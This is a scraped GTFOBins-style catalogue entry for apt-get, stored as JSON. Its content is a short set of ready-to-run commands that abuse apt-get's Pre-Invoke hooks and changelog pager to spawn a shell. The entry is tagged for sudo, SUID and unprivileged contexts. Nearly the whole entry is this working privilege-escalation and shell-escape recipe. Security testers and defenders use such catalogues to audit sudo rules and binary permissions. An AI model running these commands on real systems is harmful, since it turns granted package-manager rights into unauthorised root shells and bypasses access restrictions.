{"title": "apt-get", "source": "gtfobins", "source_label": "GTFOBins", "path": "apt-get", "html": "<h1>apt-get</h1>\n<h2>Inherit</h2>\n<pre><code class=\"language-bash\">apt-get changelog apt</code></pre>\n<h2>Shell</h2>\n<p>For this to work the target package (i.e., `sl`) must not be already installed.</p>\n<pre><code class=\"language-bash\">echo &#x27;Dpkg::Pre-Invoke {&quot;/bin/sh;false&quot;}&#x27; &gt;/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl</code></pre>\n<p>When the shell exits the `update` command is actually executed.</p>\n<pre><code class=\"language-bash\">apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code></pre>", "excerpt": "apt-get Inherit apt-get changelog apt Shell For this to work the target package (i.e., `sl`) must not be already installed. echo &#x27;Dpkg::Pre-Invoke {&quot;/bin/sh;false&quot;}&#x27; &gt;/path/to/temp-file apt-get -y install -c /path/to/temp-file…", "tags": ["func:inherit", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}